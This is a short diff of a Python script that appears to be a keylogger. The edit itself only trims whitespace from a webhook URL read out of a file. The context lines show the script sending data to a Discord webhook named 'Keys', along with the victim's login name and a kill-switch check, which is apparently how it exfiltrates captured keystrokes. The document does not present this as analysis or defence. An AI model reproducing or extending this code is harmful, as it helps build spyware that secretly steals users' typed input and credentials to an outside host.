@@ -198,7 +198,7 @@ if not kill_switch():
     if file_path.exists():
         try:
             with file_path.open('r') as file:
-                url = file.readline().replace("\n","")
+                url = file.readline().replace("\n","").strip()
                 max_lines = int(file.readline())
             webhook = DiscordWebhook(url=url, username="Keys")
             embed = DiscordEmbed(title=f"Connected to user: {os.getlogin()}", color=generate_color(os.getlogin()))
